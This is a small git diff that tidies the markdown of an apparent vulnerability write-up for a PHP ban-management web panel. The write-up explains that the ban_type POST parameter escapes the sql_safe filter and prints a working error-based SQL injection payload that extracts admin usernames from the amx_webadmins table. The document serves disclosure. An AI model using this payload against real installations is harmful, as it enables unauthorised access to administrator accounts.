@@ -13,6 +13,7 @@ There are defined bunch of variables , and all these variables are filtered with
 <br>
 <p> SQL_SAFE source</p>
 include/functions.inc.php LINE 80
+
 ```
 function sql_safe($value) {
 	if (get_magic_quotes_gpc()) $value=stripslashes_recursive($value); //function in config.inc.php
@@ -26,14 +27,16 @@ is avaliable then it wiil escape all  single-quote, double quote, backslash and 
 
 # Vulnerability
 <p>As you see all the requests are fileter except one which is the </p>
+
 ```
 $type = $_POST["ban_type"];
-``
+```
 <p>so that means that we can pass whatever we want in the $_POST request and it will executed in the database</p>
 <p>For example into the $_POST["ban_type"] we can pass sql query like below</p>
+
 ```
 "'+(1 AND extractvalue(rand(),concat(0x3a,(SELECT  username  FROM `amx_webadmins` WHERE ID > 0  LIMIT 2,1))))+'"
-``
+```
 <p>and it will return Username from the amx_webadmins</p>
 
 
